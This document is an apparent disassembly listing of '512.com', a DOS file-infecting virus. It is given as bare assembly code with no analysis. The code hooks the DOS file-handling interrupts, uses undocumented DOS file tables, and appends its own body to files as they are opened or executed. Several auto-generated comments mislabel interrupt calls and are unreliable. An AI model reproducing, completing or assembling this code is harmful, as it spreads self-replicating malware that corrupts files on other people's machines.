;PROGRAM NAME:      512.com
;-------------------------------------------------
H00100: MOV    AH,30h
        INT    21h             ;DOS Version#
        MOV    SI,0004h
        MOV    DS,SI           ;SEGMENT OPERATION
        CMP    Byte Ptr AH,1Eh
        LDS    AX,[SI+08h]
        JB     H0011B          ; . . . . . . . . .
        MOV    AH,13h
        INT    2Fh             ;Print Spooler Ctrl
        PUSH   DS              ;SEGMENT OPERATION
        PUSH   DX
        INT    2Fh             ;Print Spooler Ctrl
        POP    AX
        POP    DS              ;SEGMENT OPERATION
H0011B: MOV    DI,00F8h
        STOSW  
        MOV    AX,DS
        STOSW  
        MOV    DS,SI           ;SEGMENT OPERATION
        LDS    AX,[SI+40h]
        STOSW  
        CMP    AX,0121h
        MOV    AX,DS
        STOSW  
        PUSH   ES              ;SEGMENT OPERATION
        PUSH   DI
        JNZ    H00139          ; . . . . . . . . .
        SHL    Word Ptr SI,1
        MOV    CX,0100h
        REPZ   
        CMPSW  
H00139: PUSH   CS              ;SEGMENT OPERATION
        POP    DS              ;SEGMENT OPERATION
        JZ     H00187          ; . . . . . . . . .
        MOV    AH,52h
        INT    21h             ;INDEF FUNCTION
        PUSH   ES              ;SEGMENT OPERATION
        MOV    SI,00F8h
        SUB    DI,DI
        LES    AX,ES:[BX+12h]
        MOV    DX,ES:[DI+02h]
        MOV    CX,0104h
        REPZ   
        MOVSW  
        MOV    DS,CX           ;SEGMENT OPERATION
        MOV    DI,0016h
        MOV    Word Ptr [DI+6E],0121h
        MOV    [DI+70h],ES
        POP    DS              ;SEGMENT OPERATION
        MOV    [BX+14h],DX
        MOV    DX,CS
        MOV    DS,DX           ;SEGMENT OPERATION
        MOV    BX,[DI-14h]
        DEC    Byte Ptr BH
        MOV    ES,BX           ;SEGMENT OPERATION
        CMP    DX,[DI]
        MOV    DS,[DI]         ;SEGMENT OPERATION
        MOV    DX,[DI]
        DEC    DX
        MOV    DS,DX           ;SEGMENT OPERATION
        MOV    SI,CX
        MOV    DX,DI
        MOV    CL,08h
        REPZ   
        MOVSW  
        MOV    DS,BX           ;SEGMENT OPERATION
        JB     H00197          ; . . . . . . . . .
        INT    20h             ;TERMINATE normally
;-------------------------------------------------
H00187: MOV    SI,CX
        MOV    DS,[SI+2Ch]     ;SEGMENT OPERATION
H0018C: LODSW                  ; . . . . . . . . .
        DEC    SI
        TEST   AX,AX
        JNZ    H0018C          ; . . . . . . . . .
        ADD    Word Ptr SI,+03h
        MOV    DX,SI
H00197: MOV    AH,3Dh
        CALL   H001B0          ; . . . . . . . . .
        MOV    DX,[DI]
        MOV    [DI+04h],DX
        ADD    [DI],CX
        POP    DX
        PUSH   DX
        PUSH   CS              ;SEGMENT OPERATION
        POP    ES              ;SEGMENT OPERATION
        PUSH   CS              ;SEGMENT OPERATION
        POP    DS              ;SEGMENT OPERATION
        PUSH   DS              ;SEGMENT OPERATION
        MOV    AL,50h
        PUSH   AX
        MOV    AH,3Fh
        RETF   
;-------------------------------------------------
H001B0: INT    21h             ;INDEF FUNCTION
        JB     H001CD          ; . . . . . . . . .
        MOV    BX,AX
H001B6: PUSH   BX
        MOV    AX,1220h
        INT    2Fh             ;Print Spooler Ctrl
        MOV    BL,ES:[DI]
        MOV    AX,1216h
        INT    2Fh             ;Print Spooler Ctrl
        POP    BX
        PUSH   ES              ;SEGMENT OPERATION
        POP    DS              ;SEGMENT OPERATION
        ADD    Word Ptr DI,+11h
        MOV    CX,0200h
H001CD: RET    
;-------------------------------------------------
H001CE: STI    
        PUSH   ES              ;SEGMENT OPERATION
        PUSH   SI
        PUSH   DI
        PUSH   BP
        PUSH   DS              ;SEGMENT OPERATION
        PUSH   CX
        CALL   H001B6          ; . . . . . . . . .
        MOV    BP,CX
        MOV    SI,[DI+04h]
        POP    CX
        POP    DS              ;SEGMENT OPERATION
        CALL   H00211          ; . . . . . . . . .
        JB     H0020A          ; . . . . . . . . .
        CMP    SI,BP
        JNB    H0020A          ; . . . . . . . . .
        PUSH   AX
        MOV    AL,ES:[DI-04h]
        NOT    Byte Ptr AL 
        AND    AL,1Fh
        JNZ    H00209          ; . . . . . . . . .
        ADD    SI,ES:[DI]
        XCHG   SI,ES:[DI+04h]
        ADD    ES:[DI],BP      ;SEGMENT OPERATION
        CALL   H00211          ; . . . . . . . . .
        MOV    ES:[DI+04h],SI  ;SEGMENT OPERATION
        LAHF   
        SUB    ES:[DI],BP      ;SEGMENT OPERATION
        SAHF   
H00209: POP    AX
H0020A: POP    BP
        POP    DI
        POP    SI
        POP    ES              ;SEGMENT OPERATION
        RETF   0002h
;-------------------------------------------------
H00211: MOV    AH,3Fh
H00213: PUSHF  
        PUSH   CS              ;SEGMENT OPERATION
        CALL   H0023A          ; . . . . . . . . .
        RET    
;-------------------------------------------------
        CMP    Byte Ptr AH,3Fh
        JZ     H001CE          ; . . . . . . . . .
        PUSH   DS              ;SEGMENT OPERATION
        PUSH   ES              ;SEGMENT OPERATION
        PUSH   AX
        PUSH   BX
        PUSH   CX
        PUSH   DX
        PUSH   SI
        PUSH   DI
        CMP    Byte Ptr AH,3Eh
        JZ     H0023F          ; . . . . . . . . .
        CMP    AX,4B00h
        MOV    AH,3Dh
        JZ     H00241          ; . . . . . . . . .
H00232: POP    DI
        POP    SI
        POP    DX
        POP    CX
        POP    BX
        POP    AX
        POP    ES              ;SEGMENT OPERATION
        POP    DS              ;SEGMENT OPERATION
H0023A: JMP    Far CS:[H00004h]
;-------------------------------------------------
H0023F: MOV    AH,45h
H00241: CALL   H001B0          ; . . . . . . . . .
        JB     H00232          ; . . . . . . . . .
        SUB    AX,AX
        MOV    [DI+04h],AX
        MOV    Byte Ptr [DI-0Fh],02h
        CLD    
        MOV    DS,AX           ;SEGMENT OPERATION
        MOV    SI,004Ch
        LODSW                  ; . . . . . . . . .
        PUSH   AX
        LODSW                  ; . . . . . . . . .
        PUSH   AX
        PUSH   [SI+40h]
        PUSH   [SI+42h]
        LDS    DX,CS:[SI-50h]
        MOV    AX,2513h
        INT    21h             ;Set Intrpt Vector
        PUSH   CS              ;SEGMENT OPERATION
        POP    DS              ;SEGMENT OPERATION
        MOV    DX,0204h
        MOV    AL,24h
        INT    21h             ;Write Random Rcds
        PUSH   ES              ;SEGMENT OPERATION
        POP    DS              ;SEGMENT OPERATION
        MOV    AL,[DI-04h]
        AND    AL,1Fh
        CMP    AL,1Fh
        JZ     H00284          ; . . . . . . . . .
        MOV    AX,[DI+17h]
        SUB    AX,4F43h
        JNZ    H002C3          ; . . . . . . . . .
H00284: XOR    [DI-04h],AL
        MOV    AX,[DI]
        CMP    AX,CX
        JB     H002C3          ; . . . . . . . . .
        ADD    AX,CX
        JB     H002C3          ; . . . . . . . . .
        TEST   Byte Ptr [DI-0Dh],04h
        JNZ    H002C3          ; . . . . . . . . .
        LDS    SI,[DI-0Ah]
        DEC    AX
        SHR    Byte Ptr AH,1
        AND    AH,[SI+04h]
        JZ     H002C3          ; . . . . . . . . .
        MOV    AX,0020h
        MOV    DS,AX           ;SEGMENT OPERATION
        SUB    DX,DX
        CALL   H00211          ; . . . . . . . . .
        MOV    SI,DX
        PUSH   CX
H002AF: LODSB                  ; . . . . . . . . .
        CMP    AL,CS:[SI+07h]
        JNZ    H002DD          ; . . . . . . . . .
        LOOP   H002AF          ; . . . . . . . . .
        POP    CX
H002B9: OR     Byte Ptr ES:[DI-04h],1Fh
H002BE: OR     Byte Ptr ES:[DI-0Bh],40h
H002C3: MOV    AH,3Eh
        CALL   H00213          ; . . . . . . . . .
        OR     Byte Ptr ES:[DI-0Ch],40h
        POP    DS              ;SEGMENT OPERATION
        POP    DX
        MOV    AX,2524h
        INT    21h             ;Set Intrpt Vector
        POP    DS              ;SEGMENT OPERATION
        POP    DX
        MOV    AL,13h
        INT    21h             ;Write Random Rcds
        JMP    H00232
;-------------------------------------------------
H002DD: POP    CX
        MOV    SI,ES:[DI]
        MOV    ES:[DI+04h],SI  ;SEGMENT OPERATION
        MOV    AH,40h
        INT    21h             ;Write File/Device
        JB     H002BE          ; . . . . . . . . .
        MOV    ES:[DI],SI      ;SEGMENT OPERATION
        MOV    ES:[DI+04h],DX  ;SEGMENT OPERATION
        PUSH   CS              ;SEGMENT OPERATION
        POP    DS              ;SEGMENT OPERATION
        MOV    DL,08h
        MOV    AH,40h
        INT    21h             ;Write File/Device
        JMP    Short H002B9
;-------------------------------------------------
        IRET   
;-------------------------------------------------
        ADD    SS:[BX+SI],AL   ;SEGMENT OPERATION
